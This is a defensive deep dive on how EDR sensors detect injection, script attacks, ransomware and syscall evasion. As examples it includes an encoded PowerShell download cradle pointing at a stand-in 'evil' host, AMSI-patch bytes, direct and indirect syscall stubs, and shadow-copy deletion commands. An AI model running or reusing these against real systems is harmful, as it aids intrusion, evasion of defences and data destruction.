# EDR Hooking & Detection Mechanics — Deep Dive with Examples

Companion document to `driver-internals-detection.md`. That doc covered *how* kernel drivers work; this one covers *what* an EDR actually instruments, the concrete detection logic for four high-value scenarios (injection, script execution, ransomware encryption, syscall evasion), and worked examples showing telemetry flowing through the pipeline.

---

## 1. The EDR Sensor Map — where hooks actually live

An EDR is not one hook. It is a layered sensor fabric. Each layer sees a different slice of the truth, and attackers must evade *all* of them simultaneously.

```
Ring -1   Hypervisor / VBS (HVCI)          → syscall-entry visibility, memory integrity
Ring  0   EDR kernel driver (.sys)         → Ps*/Ob*/Cm* callbacks, minifilter,
                                             WFP callouts, ETW-TI consumption,
                                             memory scanning, handle stripping
Ring  3   EDR user-mode agent (DLL)        → injected into processes; AMSI/ETW
          injected per-process              provider registration, ntdll
                                             integrity checks, .NET/CLR events,
                                             in-process crypto-API hooks
Offline   Cloud backend                    → ML correlation, reputation,
                                             cross-host campaigns
```

### 1.1 Kernel "hooks" are really callbacks + filters

EDRs register interest through official callback/filter APIs rather than patching kernel code, because **PatchGuard** bugchecks on modifications to `ntoskrnl.exe` `.text`, the SSDT, IDT, MSRs, and other critical structures. The viable kernel instrumentation points are exactly the APIs from the companion doc:

| Sensor | API | What it yields |
|---|---|---|
| Process create/exit | `PsSetCreateProcessNotifyRoutineEx` | PID, parent PID, image path, command line, mitigation flags |
| Thread create/exit | `PsSetCreateThreadNotifyRoutineEx` | `StartAddress`, `Win32StartAddress`, owning PID/TID |
| Image/DLL/driver load | `PsSetLoadImageNotifyRoutine` | module base, size, path — for every process and `System` |
| Handle open/dup | `ObRegisterCallbacks` | target object type, `DesiredAccess` — can **strip rights** |
| Registry | `CmRegisterCallbackEx` | key path, value name, data, pre/post |
| File I/O | `FltRegisterFilter` minifilter | path, PID/TID, offset, length, data buffers, rename/delete |
| Network | `FwpsCalloutRegister` (WFP) | 5-tuple + PID at ALE layers |
| Kernel ETW | Threat-Intelligence provider | process/thread/image/**memory alloc+protect**/APC events |

A key property: these registrations return an `EX_CALLBACK_REGISTRATION` cookie. Malware cannot cleanly unregister them — it would have to locate the cookie inside the kernel callback lists (itself detectable tampering), and redundant EDRs re-register anyway.

### 1.2 The user-mode agent — "early cascade injection"

Kernel callbacks alone can't see *inside* a process (what PowerShell is about to execute, what `amsi.dll` was asked to scan). So the EDR's kernel driver injects a small user-mode agent DLL into every new process:

```
1. PsSetCreateProcessNotifyRoutineEx fires on CreateProcess
2. EDR driver queues a user-mode APC (KeInitializeApc → KeInsertQueueApc)
   targeting the new process's initial thread — BEFORE its entry point runs
3. When the thread first enters user mode, the APC delivers the agent DLL
   (manual-mapped or via a benign host DLL sideload)
4. Agent initializes: registers AMSI provider hooks, subscribes to ETW
   channels, arms ntdll .text integrity baseline, hooks crypto APIs
```

This "inject before the payload" ordering matters: if injection happened later, malware's own entry-point code would run unobserved. Some EDRs also inject into *already-running* processes on service start via `NtCreateThreadEx`/APC — which itself generates thread-create telemetry.

### 1.3 ntdll integrity — the defender's mirror of attacker tradecraft

Attackers hook `ntdll` stubs to hide from user-mode sensors; EDRs do the inverse check: keep a pristine copy of `ntdll.dll` (from disk or `KnownDlls`) and periodically hash/compare each process's `ntdll` `.text` section. Divergence = inline hook = IOC. This also protects the EDR's *own* assumptions — if stubs are hooked, syscall-number resolution (SSNs) can't be trusted for signature scans.

---

## 2. Injection detection — worked example

### 2.1 Classic remote-thread injection, traced end-to-end

Attack: `evil.exe` does `OpenProcess(PROCESS_ALL_ACCESS)` on `notepad.exe`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`.

```
API call                    Sensor that fires              Data captured
─────────────────────────────────────────────────────────────────────────────
OpenProcess(target)    →    ObRegisterCallbacks pre-op     DesiredAccess mask,
                                                          caller PID, target EPROCESS
VirtualAllocEx         →    (no direct kernel callback —   nothing yet; but the
                              seen indirectly via handle/    handle ops and later
                              section objects)              thread start addr
WriteProcessMemory     →    (same — memory op, no FS I/O)  page protections via
                                                          ETW-TI AllocVM/ProtectVM
CreateRemoteThread     →    PsSetCreateThreadNotifyRoutineEx  StartAddress, Win32Start
                                                          Address, target PID/TID
Payload runs           →    PsSetLoadImageNotifyRoutine    any DLL it loads
                            Minifilter (file drops)        dropped files on disk
                            WFP callouts                   C2 connections
```

### 2.2 The decisive heuristic: `StartAddress` vs. the VAD tree

Every thread's entry point should live inside an **image-backed** region. The EDR kernel driver, on thread-create notification:

```c
// pseudocode — what the EDR driver does in ThreadNotify()
PVOID startAddr = Info->StartAddress;              // kernel addr of thread entry
// resolve ETHREAD → EPROCESS → walk VadRoot (MMVAD tree)
BOOLEAN backed = FALSE;
for each MMVAD in TargetProcess->VadRoot:
    if (startAddr >= Vad->StartingVpn << PAGE_SHIFT &&
        startAddr <  (Vad->EndingVpn+1) << PAGE_SHIFT) {
        if (Vad->u.VadFlags.ImageMap) backed = TRUE;   // backed by an image section
        break;
    }
if (!backed) {
    // entry point is in private/anonymous memory → injected code
    QueueWorkItem(BuildAlert, ctx);   // "unbacked thread start in notepad.exe"
}
```

Remote threads started via `CreateRemoteThread`, `NtCreateThreadEx`, `RtlCreateUserThread`, or **APC injection** (`NtQueueApcThread`, `QueueUserAPC`) all funnel through the same notify routine — the API used doesn't matter, the kernel event is identical.

### 2.3 Process hollowing — detecting the image-swap

Hollowing: `CreateProcess(CREATE_SUSPENDED)` a legit binary → `NtUnmapViewOfSection` the real image → `VirtualAllocEx`+`WriteProcessMemory` the payload → resume.

What fires:

- Process-create notify: image path = `C:\Windows\System32\notepad.exe` — looks clean.
- **No** `PsSetLoadImageNotifyRoutine` for the payload (it was never mapped as an image).
- The image-load notify for `notepad.exe`'s real image *does* fire, then memory is replaced.

Detection requires comparing identities:

```
PEB->ProcessParameters->ImagePathName   → "C:\...\notepad.exe"     (claims)
EPROCESS->SectionObject / file object   → backing file of image    (should match)
On-disk hash of notepad.exe             → known-good hash          (verify)
VAD image pages vs. section contents    → page-hash scan via
                                           MmCopyVirtualMemory       (actual bytes)
```

Mismatch between claimed image and resident pages = hollowed. EDRs also flag processes whose main module VAD was written to by a *different* PID (`WriteProcessMemory` targeting image pages is an IOC in itself — writable image pages shouldn't happen in normal execution).

### 2.4 Handle stripping in action

```c
// EDR ObRegisterCallbacks pre-op, simplified
OB_PREOP_CALLBACK_STATUS PreOp(..., POB_PRE_OPERATION_INFORMATION Info)
{
    if (Info->ObjectType == PsProcessType || Info->ObjectType == PsThreadType) {
        ACCESS_MASK want = Info->Parameters->CreateHandleInformation.DesiredAccess;
        if (CallerIsUntrusted() &&
            (want & (PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD))) {
            Info->Parameters->CreateHandleInformation.DesiredAccess &=
                ~(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD);
            Log("stripped dangerous access on PID %u", TargetPid);
        }
    }
    return OB_PREOP_SUCCESS;
}
```

`OpenProcess` then returns a handle *without* the dangerous bits — `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` fail with `ACCESS_DENIED`. The *attempt* is itself the alert.

---

## 3. Script execution detection

Scripts are dangerous because they're the payload-delivery layer: PowerShell, VBScript/JScript, Office VBA, .NET assemblies. The EDR hooks three independent channels.

### 3.1 AMSI — the content scanner

**AMSI (Antimalware Scan Interface)** is the primary content-inspection hook. Instrumented interpreters call `amsi.dll!AmsiScanBuffer` / `AmsiScanString` *before executing* script content.

```
Caller side (e.g., PowerShell):
    content = "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')"
    hSession = AmsiOpenSession()
    hr = AmsiScanString(hSession, content, "PowerShell", hCtx)
         │
         ▼  amsi.dll dispatches to ALL registered providers (EDR registers one)
    EDR AMSI provider:
        content → normalize → signature + ML + behavior extraction
        return AMSI_RESULT_DETECTED (0x8000) or AMSI_RESULT_NOT_DETECTED (1)
         │
         ▼
    PowerShell aborts execution if result >= AMSI_RESULT_DETECTED
```

AMSI result enum (abridged):

| Value | Meaning |
|---|---|
| `AMSI_RESULT_CLEAN` (0) | provider says clean / nothing scanned |
| `AMSI_RESULT_NOT_DETECTED` (1) | scanned, no match |
| `AMSI_RESULT_DETECTED` (0x8000) | signature/ML hit — caller must block |
| `AMSI_RESULT_BLOCKED_BY_ADMIN_START/END` (0x4000–0x4fff) | admin block range |

**Who calls AMSI:** PowerShell (all content, post-parsing per script block), `cscript`/`wscript` (VBScript/JScript), `mshta`, Office VBA macros (since 2018), .NET `Assembly.Load` (since .NET 4.8), Exchange transport agents, third-party script hosts.

### 3.2 Worked example: encoded PowerShell cradle

```
Attacker runs:
  powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AeAAuAHAAcwAxACcAKQA=

Telemetry pipeline:

1. PsSetCreateProcessNotifyRoutineEx
   → image= powershell.exe, parent=explorer.exe (or winword.exe — suspicious!),
     command line contains -enc → base64 blob → decode offline → raw cradle

2. AMSI provider (inside powershell.exe)
   → PowerShell decodes -enc, parses, calls AmsiScanString on the script block:
     "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')"
   → EDR signatures match: IEX + DownloadString + http + .ps1 → DETECTED
   → PowerShell exits before running anything. DONE at step 2.
```

If AMSI blocks it, the whole attack ends — that's why attackers invest in bypasses.

### 3.3 AMSI bypasses and the EDR counter-moves

| Bypass technique | How it works | How EDR still catches it |
|---|---|---|
| **Patch `AmsiScanBuffer`** (`mov eax,0x80000057; ret` or `xor eax,eax; ret` in `amsi.dll`) | scan returns clean instantly | EDR integrity-checks `amsi.dll` `.text` hash per process (same mechanism as ntdll check); in-memory patch leaves private dirty pages / RWX transitions visible to ETW-TI ProtectVM; also patches are process-scoped → other processes still scanned |
| **`AmsiFailAsm` / `_amsiInitFailed` reflection** (Matt Graeber, 2019) | PowerShell-only: reflection sets private static field so AMSI init is skipped | The *bypass script itself* is AMSI-scanned → signature on the reflection strings; .NET CLR ETW logs the reflection-heavy assembly; behavioral: powershell spawning encoded child |
| **PowerShell v2 downgrade** (`powershell -Version 2`) | v2 has no AMSI integration | Command line `-Version 2` is a standalone IOC; PSv2 absence of AMSI is itself alerted on; ETW still logs |
| **ETW patching** (`EtwEventWrite`/`EtwEventWriteTransfer` inline patch) | silences script-block logging channels | EDR kernel-side ETW-TI still emits events (different provider, kernel-resident); `EtwEventWrite` integrity check; patched stub = unbacked/RX anomaly; patching is IOC |
| **Content obfuscation** (concatenation, env vars, `Invoke-Obfuscation`) | AMSI sees mangled text that doesn't match signatures | AMSI scans *post-deobfuscation* where possible (PowerShell passes normalized buffer); ML on token entropy; behavioral layer: download cradles, child spawning, encoded args |
| **AMSI provider tampering** (registry `HKLM\SOFTWARE\Microsoft\AMSI\Providers`) | unregister/disable providers | `CmRegisterCallbackEx` watches that exact key — provider removal is a high-fidelity alert |

### 3.4 ETW — the passive recording layer

Independent of AMSI, EDRs consume ETW channels in real time (`StartTrace` consumers):

| Channel / Provider | Events of interest |
|---|---|
| `Microsoft-Windows-PowerShell/Operational` | 4103 module logging, **4104 script block logging** (full script text) |
| PowerShell Analytics | pipeline execution detail |
| `Microsoft-Windows-DotNETRuntime` | CLR loader: assembly loads, JIT compilation — catches .NET tradecraft |
| `Microsoft-Windows-Kernel-*` | process/thread/image/memory kernel events |
| **Threat-Intelligence provider** `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | kernel-generated: process create/exit, thread create/exit, image load, **virtual-memory alloc/protect**, user-APC queue — the EDR's syscall-proof ground truth (see §5) |

Script-block logging (4104) is especially valuable: even if a script is obfuscated at rest, PowerShell logs the *deobfuscated* block before execution — unless the attacker patched ETW, which is itself caught (§3.3).

---

## 4. Ransomware detection — telling encryption from compression & BitLocker

This is the hardest differentiation problem in EDR design. All three activities move lots of high-entropy bytes. The answer is **multi-signal correlation**, not any single signal.

### 4.1 What the minifilter actually sees

For every file write, the EDR's minifilter post-op callback gets `PFLT_CALLBACK_DATA` containing:

- full file path + file ID (survives renames)
- issuing PID/TID → process lineage
- byte offset, length
- **the write buffer itself** → compute Shannon entropy, byte histogram, compression-ratio estimates
- operation type (write / set-info(rename, delete, disposition) / directory enumeration)

### 4.2 The signal stack, weakest → strongest

| # | Signal | Rationale | Strength |
|---|---|---|---|
| 1 | **File churn rate** | ransomware encrypts hundreds–thousands of distinct files per minute from one PID | medium — fast archivers also churn |
| 2 | **Write entropy** | ciphertext ≈ 8 bits/byte; rolling mean over write buffers stays > ~7.2 | medium — zip/gpg output identical |
| 3 | **Enumerate-then-encrypt pattern** | ransomware lists whole directory trees (`IRP_MJ_DIRECTORY_CONTROL` breadth) then writes across them | medium-high |
| 4 | **Same-file read→write→rename/delete** | encrypt-in-place or rename-to-new-extension sequences | high |
| 5 | **Novel-content check** | write buffer hash matches no existing file → genuinely *new* ciphertext (vs. robocopy/backup copying known content) | high |
| 6 | **Known-extension / note IOCs** | `.locked .zepto .cerber .encrypted`, `README_DECRYPT.txt`, `_readme.html` | high but signature-bound — novel families evade |
| 7 | **VSS/backup destruction** | `vssadmin delete shadows`, `wbadmin delete backup`, `wevtutil cl`, `bcdedit`, WMI `Win32_ShadowCopy.Delete` in command line or child processes | very high — almost no legit workflow does this mid-encryption |
| 8 | **Crypto API telemetry** | burst of `BCryptGenRandom`/`BCryptEncrypt`/`CryptEncrypt` calls, per-file key generation | high — needs user-mode agent hook on `bcryptprimitives.dll`/`ncrypt` |
| 9 | **Canary/honeyfiles** | EDR drops decoy `passwords.docx`/`tax_2024.pdf` in user dirs; *any* write to them = near-certain ransomware | very high, earliest possible signal |
| 10 | **Mass rename w/o content change** | rename-only families — file ID same, name flipped | medium |

Worked pseudocode for the core minifilter heuristic:

```c
// EDR minifilter — post-write aggregation (runs in work item, not callback)
typedef struct _ProcStats {
    ULONG   distinctFiles;   // hash set of FileReferenceNumbers written
    ULONG   highEntropyWrites;
    ULONG   totalWrites;
    ULONG   renames, deletes;
    LARGE_INTEGER windowStart;
} ProcStats;

// on each post-write for PID p:
//   stats[p].distinctFiles.insert(FileId)
//   e = shannonEntropy(WriteBuffer, Length)
//   if (e > 7.2) stats[p].highEntropyWrites++
//   stats[p].totalWrites++

// every N seconds, evaluate:
if (distinctFiles > 200 &&
    highEntropyWrites / totalWrites > 0.8 &&
    renames + deletes > 50 &&
    !IsSignedSystemProcess(p))
        RaiseAlert(RANSOMWARE_SUSPECT, p);
```

### 4.3 The three-way differentiation

#### vs. `compress.exe` / 7-Zip / `Compress-Archive` / `tar`

| Property | Archiver | Ransomware |
|---|---|---|
| Destination files | **exactly one** (the `.zip`/`.7z`) | **every source file** (in-place or renamed) |
| Source files | read-only, never modified/deleted | overwritten, renamed, or deleted |
| Entropy location | one output stream | spread across N files |
| Deletes | none | originals destroyed or renamed |
| VSS/backup cmds | never | routine |
| Process | signed `C:\Windows\System32\`, or `Program Files` archiver | dropped EXE, temp dir, unsigned or stolen cert |
| Lineage | explorer/services → archiver | Office/JS → powershell → ransomware, or direct user launch |

The single decisive check: **count distinct destination files written**. Archiver = 1. Ransomware = N.

#### vs. BitLocker / device encryption

BitLocker is the cleanest contrast because it operates at a **different layer entirely**:

```
App writes "hello.docx" ──► minifilter sees plaintext write ──► NTFS ──►
    fvevol.sys (volume filter) encrypts at SECTOR level ──► disk ciphertext
```

- The encrypted bytes never appear as *file-level* writes — the minifilter sees normal application I/O (plaintext buffers), because `fvevol.sys` encrypts below/alongside the filesystem, not per-file.
- **No per-file metadata churn**: no mass renames, no deletes, no ransom notes, no extension changes. BitLocker progress is measured in GB over hours, not files per minute.
- Runs as a SYSTEM service (`manage-bde`, `fveui`, automatic device encryption), not a user-launched binary.
- Legitimate full-volume encryption tools (VeraCrypt system encryption) behave the same way — sector-level, service context.

So a BitLocker encryption run produces **zero** ransomware signals at the minifilter layer.

#### vs. legitimate file-level encryption (EFS, GPG, 7z-AES, zipcrypto)

| Property | EFS (`cipher /E`) | GPG/7z file encrypt | Ransomware |
|---|---|---|---|
| Output | same path, NTFS `FE_FLAG_ENCRYPTED` attribute | **one** `.gpg`/`.7z` file | N files rewritten |
| Originals | transparently decryptable by same cert | untouched | destroyed/overwritten |
| Binary | `cipher.exe` in System32, signed | gpg/7z signed | dropped payload |
| Extent | user-selected dir or folder-EFS inheritance | explicit file list | entire drive breadth-first |
| Side effects | none | none | VSS deletion, notes, wallpaper reg keys |

Edge case worth noting: `cipher /E /S:C:\Users` *does* recursively encrypt in place — superficially ransomware-like. Differentiators: signed System32 binary, no ransom note, no VSS destruction, no mass-rename, and EFS encryption is NTFS-attribute driven (the `FILE_ATTRIBUTE_ENCRYPTED` flag on the file object is visible to the minifilter — ransomware doesn't set it).

#### vs. backup/sync tools (`robocopy /MIR`, Veeam, OneDrive)

Robocopy mirror *does* mass-delete — the scariest false positive. Counters:

- **Novel-content check**: robocopy writes are byte-identical copies of files that exist elsewhere → write-buffer hash matches a known file. Ransomware output is novel ciphertext matching nothing.
- Deletion without preceding encryption writes, or deletions matching a mirror manifest pattern.
- Signed vendor binaries in stable install paths; service lineage.

### 4.4 Crypto-API telemetry — seeing key generation

Software crypto (AES via CNG) runs in `bcryptprimitives.dll` — **user mode**, so no kernel callback sees `BCryptEncrypt`. The EDR user-mode agent (already injected per §1.2) hooks:

```
bcryptprimitives!BCryptGenRandom   → per-file key generation burst
bcryptprimitives!BCryptEncrypt     → encrypt call volume vs. file I/O correlation
ncrypt!NCryptEncrypt               → CNG key-storage path
```

Ransomware pattern: `GenRandom` (or RSA keygen via `CryptAcquireContext`/BCrypt) → N×`Encrypt` interleaved with file writes. Legit archivers show the same shape but for **one** output file — the file-I/O correlation from the minifilter disambiguates again.

### 4.5 Canary files — the earliest signal

The strongest single technique: the EDR drops decoy files (`important_passwords.docx`, `Q4_tax_return.pdf`) containing unique marker content into user profile dirs, synced folders, and network shares. The minifilter watches for *any* write/set-info on those file IDs. First encrypted write to a canary → the owning PID is ransomware with near-certainty → instant kill via `PsTerminateProcess`-equivalent before the second file is touched. This beats every rate/entropy threshold because it has ~zero false positives.

### 4.6 Modern evasions and counter-evasion

| Ransomware adaptation | EDR counter |
|---|---|
| **Intermittent encryption** (LockBit encrypts only first/last chunks per file) | per-file entropy still elevated on written regions; partial-write entropy sampling; canary files catch regardless of *how much* is encrypted |
| **Rename-only / note-only** (claims encryption, or encrypts on detach) | extension-flip + note-file + VSS-deletion signals still fire; canary still catches actual encryption |
| **Slow encryption** (below rate thresholds) | canary files + entropy-per-file don't depend on rate; entropy accumulation over window |
| **Living-off-land encryption** (PowerShell `System.Security.Cryptography`, certutil) | AMSI/ETW see the script; crypto-API hooks see `Aes.Create()`; process lineage is powershell→file writes |
| **Targeted encryption** (only specific extensions/dirs, skips large files) | enumerate-then-write pattern + canary placement inside likely target dirs |
| **VSS deletion via WMI/COM instead of vssadmin** | process telemetry sees `Win32_ShadowCopy` Delete via WMI provider host; command-line agnostic ETW |

---

## 5. Direct & indirect syscalls — what they evade, what still catches them

### 5.1 Anatomy of the thing being evaded

A normal `NtCreateFile` call goes through an `ntdll` stub:

```
; ntdll!NtCreateFile  (x64, Windows 10/11 — bytes vary by build)
4C 8B D1                mov r10, rcx          ; arg4 home → r10 (kernel ABI)
B8 xx xx xx xx          mov eax, SSN         ; syscall service number, e.g. 0x55
F6 04 25 08 03 FE 7F 01 test byte ptr ds:7FFE0308h, 1
75 03                   jne int2e_path
0F 05                   syscall              ; ← Ring 0 entry
C3                      ret
```

User-mode EDR agents and AV hooks patch these stubs (or the IAT/EAT pointing at them). Attackers respond with two syscall-evasion families:

### 5.2 Direct syscalls

The attacker extracts/copies the stub bytes into their own allocated memory (or hand-writes them — SysWhispers, Syscalls-Direct) and executes `syscall` from *unbacked* memory:

```
attacker shellcode (private RX memory):
    mov r10, rcx
    mov eax, 0x55          ; SSN resolved at runtime from clean ntdll
    syscall                ; CPU → Ring 0, RIP = KiSystemCall64
    ret                    ; returns to attacker code
```

**What it bypasses:** every user-mode hook on `ntdll` — there is no stub to hook. The syscall never touches instrumented code.

### 5.3 Indirect syscalls

A refinement: instead of executing `syscall` in attacker memory, jump to a `syscall; ret` gadget *inside* `ntdll`'s `.text`:

```
attacker code:
    ... set up args, eax = SSN ...
    jmp ntdll+0x1234      ; lands on a "syscall; ret" gadget inside legit ntdll
    ; at the instant of `syscall`, RIP is inside ntdll's image → defeats
    ; naive "caller must be in ntdll" return-address checks
    ; ret pops attacker's return address → execution continues in shellcode
```

Also common: map a *private copy* of `ntdll`'s `.text` and use gadgets there. The syscall instruction executes at an address that looks module-backed, while the caller remains unbacked.

### 5.4 The critical fact: the kernel can't tell the difference

```
user:  [ntdll stub] ──hooked──► EDR sees it          (classic path)
user:  [attacker mem] ──syscall──┐
user:  [ntdll gadget] ──syscall──┼──► KiSystemCall64 ──► SSDT[SSN]
                                 │        │
                                 │        ▼
                                 │   nt!NtCreateFile  ← SAME kernel function
                                 │        │
                                 ▼        ▼
                          kernel callbacks, ETW-TI,
                          minifilter, WFP — ALL fire identically
```

The SSN is unchanged, so the kernel dispatches to the same `Nt*` implementation. **Every kernel-side sensor fires exactly as before.** This is the entire reason modern EDRs are kernel-resident: syscall evasion defeats user-mode hooks by design, but it cannot defeat the fact that the operation still has to happen in the kernel.

### 5.5 How EDRs detect the evasion *technique* itself

Since the payload events are still caught, the remaining question is flagging the evasion method as an IOC:

| Detection method | What it catches | Mechanism |
|---|---|---|
| **Unbacked executable memory scan** | direct syscalls, manual-mapped shellcode | kernel driver walks `EPROCESS->VadRoot`; flags private VADs with execute permission (`VadFlags.Protection` ∈ RX/RWX, no `ImageMap`); reads pages via `MmCopyVirtualMemory`, pattern-matches `0F 05` syscall opcodes near `mov eax,imm` stubs |
| **Manual-map PE detection** | reflective loading, module stomping | `MZ`/`PE` headers or full PE structure found in private (non-image) memory |
| **Thread start address** | entry into injected code | `PsSetCreateThreadNotifyRoutineEx` → `StartAddress` outside all image VADs (§2.2) |
| **Memory alloc/protect telemetry** | the RW→RX or RWX staging every injector needs | **ETW-TI provider** emits AllocVM/ProtectVM events for `NtAllocateVirtualMemory`/`NtProtectVirtualMemory` — syscall-path-independent |
| **ntdll `.text` integrity** | user-mode hooks *and* detection of second ntdll copies | pristine-copy hash compare per process; private RWX region containing ntdll stub bytes = IOC (SysWhispers-style SSN harvesting maps ntdll privately) |
| **Stack/call-chain heuristics** | direct syscalls (user agent) | agent walks thread stacks: return addresses outside `ntdll`/known modules = shellcode; indirect syscalls partially evade this — ret lands via gadget — hence kernel-side weight |
| **Return-address-at-syscall checks** | naive indirect-syscall detection | at `syscall`, user RIP inside `ntdll` image = indirect; outside = direct. Limited use — most EDRs don't hook the stub anymore, but VTL-1/hypervisor sensors can inspect the trap frame's user RIP directly |
| **Hypervisor/VBS visibility** | everything above | Ring -1 sensor observes syscall entry with full context — the endgame for unhookable telemetry |

### 5.6 SSN resolution — the attacker's sub-problem

Direct/indirect syscalls still need the correct syscall number, which varies per Windows build and shifts when `ntdll` is hooked (which is why Halo's Gate/Tartarus Gate read *neighboring* stubs). Attackers resolve SSNs by:

- reading stub bytes from a clean `ntdll` (disk copy, fresh `KnownDlls` section, or Halo's-Gate neighbor stubs)
- hardcoding per-build SSN tables (breaks on updates → crash if wrong)

EDR counters: ntdll integrity monitoring detects *which* stubs were patched (revealing the hook layout the attacker is evading); SSN-table signatures appear in memory scans; and a wrong SSN = bugcheck = noisy failure.

### 5.7 Evasion-vs-detection matrix

| Attacker technique | Bypasses | Still caught by |
|---|---|---|
| User-mode ntdll inline hook evasion via **direct syscall** | user-mode API hooks, IAT/EAT | kernel callbacks, ETW-TI, minifilter, WFP, unbacked-memory scan |
| **Indirect syscall** (ntdll gadget) | above + return-address checks | same kernel sensors; unbacked caller memory; thread-start analysis |
| **Fresh/private ntdll copy** for SSNs | SSN resolution vs. hooks | private executable memory scan; image-vs-private VAD diff |
| **Hell's/Halo's/Tartarus Gate** SSN resolution | hooked-stub SSN corruption | kernel path unaffected; neighbor-stub reads are in-process only |
| **Syscall via WOW64** (` Heaven's Gate `) | x64 hook coverage gaps | same kernel dispatch; ETW-TI |
| **DKOM** (unlink EPROCESS) | process-list enumeration | thread/handle/object callbacks still fire per-object; ETW-TI; memory scans via other anchors |
| **ETW-TI patching** | kernel ETW consumer blindness | requires kernel patch → PatchGuard/HVCI block; driver-load telemetry; behavior continues via callbacks anyway |

---

## 6. The unified detection pipeline

All four scenarios funnel into the same architecture:

```
Kernel sensors (callbacks, minifilter, WFP, ETW-TI)
        │  raw events: {type, pid, tid, path, buffer-hash, entropy, ...}
        ▼
EDR kernel driver ── batches, enriches (lineage lookup, signer check,
        │            reputation cache), rate-limits
        ▼  filter port / ALPC / shared section
EDR user service ── correlation engine:
        │   • Sigma/YARA-style rules on event fields
        │   • sequence rules (enumerate→write→rename→VSS-delete)
        │   • ML on behavioral features (churn rate, entropy, lineage)
        │   • cross-sensor joins (AMSI content + process + network)
        ▼
Verdict: alert severity + response actions
        │
        ▼  response loop back down:
   kill process (PsTerminateProcess/ZwTerminateProcess from driver)
   strip handles (ObRegisterCallbacks pre-op)
   block network (WFP deny at ALE layer)
   isolate host (WFP default-deny + firewall rules)
   quarantine file (minifilter rename to quarantine dir)
```

### Coverage matrix — one attack, every sensor

| Attack stage | Kernel callbacks | Minifilter | WFP | AMSI/ETW | Memory scan |
|---|---|---|---|---|---|
| `powershell -enc` cradle | process create (cmdline) | — | — | **AMSI blocks here** | — |
| AMSI bypass attempt | — | — | — | bypass script scanned; ETW patch = IOC | amsi.dll/ntdll .text diff |
| Inject into notepad | thread create (unbacked start) | — | — | ETW-TI alloc/protect | unbacked RX pages |
| Process hollowing | process + image notify | — | — | ETW-TI | VAD/page-hash vs. claimed image |
| Ransomware encrypt | — | **churn+entropy+renames** | C2 blocks | script if LOLBin | — |
| VSS destruction | process create (vssadmin child) | — | — | cmdline/ETW | — |
| Direct syscall injection | thread/image notify | drops | C2 | ETW-TI alloc/protect | **syscall stub in private mem** |
| BYOVD kill EDR | driver load notify | — | — | — | vuln-driver blocklist |

---

## 7. Key takeaways

1. **EDRs hook layers, not functions.** Callbacks, minifilters, WFP callouts, AMSI providers, ETW consumers — the sensor fabric covers every transition a payload must make.
2. **Content inspection (AMSI) kills script attacks at parse time** — before execution — which is why AMSI bypass is the first move of every script-based intrusion, and why bypass attempts are themselves high-fidelity IOCs.
3. **Ransomware detection is correlation, not signature.** No single signal separates encryption from compression; the *combination* (N destination files + high entropy + renames + VSS deletion + unsigned lineage + canary touch) is what reaches confidence. BitLocker escapes entirely because it encrypts below the file layer; archivers escape because they write exactly one file.
4. **Direct/indirect syscalls defeat user-mode hooks but not physics.** The operation still enters the kernel through the same `Nt*` implementation — kernel callbacks and ETW-TI are path-independent. The evasion technique itself becomes detectable via unbacked executable memory, which is where every syscall-evasion family converges.
5. **The attacker must win everywhere; the defender needs one sensor to fire.** Redundancy across layers is the architectural answer to an adversary that actively hunts each sensor.

---

## References

- Companion doc: `driver-internals-detection.md` (kernel driver internals, callback APIs, IRPs)
- Microsoft Learn — AMSI: https://learn.microsoft.com/en-us/windows/win32/amsi/
- Microsoft Learn — ETW Threat-Intelligence provider: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/threat-intelligence-etw-provider
- SysWhispers / Hell's Gate / Halo's Gate / Tartarus Gate writeups (Syscalls-Direct, smellyvx)
- Matt Graeber — "Bypassing AMSI" (AmsiFailAsm, 2019); Amos Xiao / @_FuzzySecurity AMSI research
- TheWover / David Bitton — "Detecting Process Hollowing"; Volatility `malfind` plugin (private RX pages)
- CrowdStrike / SentinelOne public research on ransomware behavioral detection (canary files, entropy)
- `fltmc instances`, `logman query providers`, WinDbg `!process 0 7`, `!vad` for live inspection
